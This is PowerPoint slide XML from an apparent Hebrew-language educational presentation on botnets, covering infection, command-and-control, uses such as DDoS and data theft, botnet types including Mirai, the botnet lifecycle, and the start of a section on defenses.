            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, אתרי אינטרנט נגועים, קבצים מצורפים, תוכנות פרוצות, או כל אמצעי אחר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ברגע שהמשתמש מוריד ומפעיל את הקובץ הזדוני, המחשב שלו נדבק והופך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>לבוט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוכנה הזדונית פועלת ברקע מבלי שהמשתמש יבחין בכך, ומשאירה את המחשב חשוף לשליטה מרחוק.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שליטה ובקרה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>C&amp;C – (Command and Control)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בוט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ברשת מתחבר לשרת שליטה ובקרה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> C&amp;C </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או לפלטפורמה אחרת כגון רשתות חברתיות, ערוצי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IRC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שממנה התוקף שולח פקודות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף שולח פקודות שונות לכל הבוטים, והם מבצעים את הפעולות בהתאם להנחיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ביצוע פעולות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הבוטים יכולים לבצע פעולות מזיקות בצורה מתואמת. לדוגמה, בהתקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DDoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, כל הבוטים שולחים בקשות לאתר מסוים בו-זמנית, במטרה להעמיס על השרת ולגרום לקריסתו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33105010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056E207-DDEE-43D5-AA6A-C6EFF8C61784}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2961860" y="642594"/>
            <a:ext cx="8163339" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמאות לפעולות של רשת בוטים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B7749212-F2A8-4862-AFA4-ECD0BA0BE27D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>DDoS (Distributed Denial of Service)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DDoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא אחת השימושים הנפוצים ביותר לרשת בוטים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בדוגמה זו, התוקף שולח פקודה לכל הבוטים ברשת לשלוח בקשות מרובות לאתר או לשרת מסוים.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השרת אינו מסוגל להתמודד עם עומס הבקשות הגבוה, מה שגורם לו להפסיק לפעול או להאט בצורה משמעותית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. הפצת דואר זבל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Spam</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>רשתות בוטים משמשות גם להפצת כמויות אדירות של הודעות דוא"ל זבליות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Spam</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בוט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שולח מאות או אלפי הודעות דוא"ל שמכילות פרסומות זדוניות, ניסיונות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, או קישורים לאתרים נגועים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1303587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777AA80-A077-4768-A739-101DD4283C25}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1898374" y="642594"/>
            <a:ext cx="9226826" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - דוגמאות לפעולות של רשת בוטים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA9179B6-0FD2-4BBF-BF93-204FED115F25}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>3. גניבת מידע</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בוטים יכולים גם לאסוף מידע רגיש מהמחשבים הנגועים, כמו סיסמאות, פרטי כרטיסי אשראי, ומידע אישי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המידע נשלח לשרת שליטה ובקרה שבו התוקף אוסף את המידע לשימוש זדוני או למכירה בשוק השחור.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>4. כריית מטבעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>קריפטוגרפיים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בחלק מהמקרים, רשתות בוטים משמשות לכריית מטבעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>קריפטוגרפיים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>ביטקוין</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף מנצל את כוח המחשוב של הבוטים כדי לכרות מטבעות ולייצר רווחים על חשבון הקורבנות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24331670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AF1F3F2-5417-4F07-8BA8-9FE4A63E870A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6410738" y="642594"/>
            <a:ext cx="4714461" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגי רשתות בוטים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4E8B957D-33DB-4E76-A9D9-9FF5A66F1554}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2103119"/>
            <a:ext cx="10058400" cy="4556097"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Peer-to-Peer Botnets .1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>במקום להשתמש בשרת מרכזי לשליטה ובקרה (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(C&amp;C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, רשתות בוטים מסוג זה פועלות בשיטת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Peer-to-Peer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כלומר, כל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בוט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ברשת מתקשר עם אחרים, ללא צורך בשרת מרכזי. זה מקשה על איתור והשבתה של הרשת כולה, משום שאין נקודת תורפה אחת שאפשר לפגוע בה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>HTTP Botnets .2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>רשתות בוטים שמבוססות על פרוטוקול</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מתקשרות דרך אתרי אינטרנט או שרתים רגילים. זה מקשה על זיהוי הבוטים, כי התקשורת שלהם נראית כמו גלישה רגילה באינטרנט. תוקפים יכולים להשתמש באתרים תמימים לכאורה כתחנות שליטה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>IoT Botnets .3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>רשתות בוטים שמבוססות על התקנים של האינטרנט של הדברים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IoT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כמו מצלמות אבטחה, נתבים, טלוויזיות חכמות, ועוד. מכשירים אלו לעיתים קרובות מאובטחים בצורה חלשה ויכולים להפוך לבוטים בקלות. דוגמה מפורסמת היא רשת הבוטים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Mirai</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שהשתמשה במכשירי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IoT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לבצע מתקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> DDoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עצומות.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13397788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E5D876-76AC-4C76-99EC-1099576301F4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4065104" y="642594"/>
            <a:ext cx="7060096" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מחזור החיים של רשת בוטים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B588DCA0-0B11-4C6B-83FA-D2A3029653D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>רשת בוטים עוברת מספר שלבים במהלך חייה:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. הדבקה והתרחבות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Infection and Propagation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף מדביק את המחשבים הראשונים באמצעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>וקטורי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התקפה שונים (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, ניצול פרצות, הורדות נגועות וכו').</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הבוטים עצמם יכולים להפיץ את התוכנה הזדונית למחשבים נוספים, מה שמאפשר לרשת הבוטים לגדול ולהתרחב.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. שליטה ובקרה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Command and Control</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לאחר ההדבקה, הבוטים מתחברים לשרת שליטה ובקרה (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (C&amp;C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או מתקשרים באמצעות פרוטוקולים מבוזרים כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>P2P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף יכול לשלוח פקודות לבוטים לביצוע פעולות כמו תקיפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DDoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, גניבת מידע, הפצת דואר זבל ועוד.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27262596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DAF96C-A6A7-4B70-A09C-6417E0842B2D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1997764" y="642594"/>
            <a:ext cx="9127435" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - מחזור החיים של רשת בוטים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{33C0A9B0-E912-495D-B9D3-3846E7DEC061}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>3. ביצוע משימות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Execution of Tasks </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הבוטים מבצעים את המשימות שהוקצו להם. המשימות יכולות להשתנות לאורך זמן בהתאם לפקודות חדשות שמגיעות מהתוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>4. התחמקות מזיהוי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Evasion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הבוטים יכולים לעדכן את עצמם כדי להימנע מזיהוי על ידי תוכנות אנטי-וירוס או מערכות זיהוי חדירות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> זה נעשה על ידי טכניקות כמו ערפול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Obfuscation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הצפנה של התקשורת עם ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ,C&amp;C </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או שינוי קבוע של תצורת הפעולה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>5. תחזוקה ועדכונים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Maintenance and Updates </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף ממשיך לעדכן את רשת הבוטים, להוסיף לה יכולות חדשות, או לשנות את שרתי ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> C&amp;C </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי להימנע ממעקב והשבתה.</a:t>
            </a:r>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10097699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F99691B-A340-483D-9FB8-9B92BF319E95}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3588026" y="642594"/>
            <a:ext cx="7537174" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך להגן מפני רשתות בוטים?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{62DEC6C9-5EC4-4834-8C88-CAF0D98C3A1B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>עדכון תוכנה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תמיד לשמור על עדכונים שוטפים של מערכת ההפעלה והתוכנות במחשב כדי לסגור פרצות אבטחה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש בתוכנות אנטי-וירוס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: התקנת תוכנות אנטי-וירוס ואנטי-מלקוד יעזרו לזהות ולהסיר תוכנות זדוניות שעלולות להפוך את המחשב שלך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
